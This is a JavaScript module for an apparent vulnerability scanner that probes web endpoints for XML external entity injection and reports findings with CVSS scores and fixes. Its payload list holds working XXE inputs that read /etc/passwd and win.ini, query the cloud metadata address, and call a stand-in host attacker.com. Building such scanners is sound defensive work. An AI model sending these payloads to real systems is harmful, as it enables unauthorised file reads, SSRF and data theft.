/**
 * XXE Scanner - XML External Entity Injection
 */
const { SecureHttpClient } = require('../utils/secure-http-client');
const { logger } = require('../utils/error-handler');

class XXEScanner {
  constructor() {
    this.httpClient = new SecureHttpClient({ timeout: 10000, maxContentLength: 5 * 1024 * 1024 });

    this.xxePayloads = [
      // Basic file read
      `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
      // Error-based
      `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo/>`,
      // Windows
      `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>`,
      // Network
      `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
      // Blind via DNS
      `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><root>&xxe;</root>`
    ];

    this.indicators = [
      /root:/m, /uid=0/i, /\[fonts\]/i, /\[mail\]/i, /ami-id/i,
      /bin\/bash/i, /nobody:/m, /daemon:/m
    ];
  }

  async scan(url) {
    const findings = [];
    const errors = [];

    try {
      logger.logInfo('Starting XXE scan', { url });

      // Find XML endpoints
      const endpoints = await this.findXMLEndpoints(url);

      for (const endpoint of endpoints) {
        for (const payload of this.xxePayloads.slice(0, 3)) {
          try {
            const resp = await this.httpClient.post(endpoint, payload, {
              headers: {
                'Content-Type': 'application/xml',
                'Accept': 'application/xml, text/xml, */*'
              },
              timeout: 8000
            });

            if (this.detectXXE(resp.data)) {
              findings.push({
                severity: 'critical',
                category: 'injection',
                type: 'xxe',
                title: 'XML External Entity (XXE) Injection',
                description: `The application processes XML input and resolves external entities. This allows reading local files, SSRF, and potentially remote code execution.`,
                parameter: 'XML body',
                payload: payload.substring(0, 100) + '...',
                evidence: {
                  endpoint,
                  detection: 'response_based',
                  matched: this.getMatch(resp.data)
                },
                cvss_score: 9.8,
                confidence: 'high',
                remediation_text: 'Disable XML external entity processing. Use safe XML parsers with XXE disabled by default.',
                remediation_effort_hours: 4,
                owasp_category: 'A05:2021 – Security Misconfiguration',
                cwe_id: 'CWE-611'
              });
              break;
            }
          } catch (e) {}
          await this.sleep(200);
        }
      }

    } catch (err) {
      errors.push(err.message);
      logger.logError(err, { context: 'XXE scan', url });
    }

    return { vulnerabilities: findings, errors, url, scanned: new Date().toISOString() };
  }

  async findXMLEndpoints(url) {
    const endpoints = [url];
    try {
      // Common XML endpoints
      const base = new URL(url).origin;
      const common = ['/api', '/api/v1', '/soap', '/xml', '/service', '/ws', '/upload'];
      endpoints.push(...common.map(p => base + p));
    } catch (e) {}
    return endpoints;
  }

  detectXXE(body) {
    if (!body || typeof body !== 'string') return false;
    return this.indicators.some(p => p.test(body));
  }

  getMatch(body) {
    if (!body) return '';
    for (const p of this.indicators) {
      const m = body.match(p);
      if (m) return m[0].substring(0, 50);
    }
    return '';
  }

  sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
}

module.exports = XXEScanner;
